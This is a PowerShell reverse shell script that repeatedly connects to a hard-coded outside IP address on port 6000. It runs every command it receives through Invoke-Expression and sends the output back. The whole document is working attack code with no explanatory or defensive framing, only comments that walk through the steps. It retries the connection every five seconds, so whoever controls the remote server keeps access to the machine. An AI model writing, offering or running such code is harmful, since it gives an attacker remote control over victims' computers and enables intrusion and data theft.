while (true) {
    try {
        # Attempt to establish a TCP connection to your Linux VPS
        $client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 6000);
        $stream = $client.GetStream();
        $writer = New-Object System.IO.StreamWriter($stream);
        $reader = New-Object System.IO.StreamReader($stream);
        $buffer = New-Object System.Byte[] 1024;
        $encoding = New-Object System.Text.AsciiEncoding;

        # Send an initial prompt
        $writer.Write($encoding.GetBytes("PS " + (pwd).Path + "> "));
        $writer.Flush();

        # Continuously read and execute commands from the Linux VPS
        while ($true) {
            try {
                $data = $reader.ReadLine();
                if ($data) {
                    # Execute the command and capture the output
                    $sendback = (iex $data 2>&1 | Out-String);
                    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
                    # Send the output back to the Linux VPS
                    $writer.Write($encoding.GetBytes($sendback2), 0, $sendback2.Length);
                    $writer.Flush();
                }
            } catch {
                # Close the connection if an error occurs in the inner loop
                $writer.Close();
                $client.Close();
                break;
            }
        }
    } catch {
        # Handle errors in establishing the connection
        Write-Host "Connection failed. Retrying in 5 seconds..."
        Start-Sleep -Seconds 5
    }
}
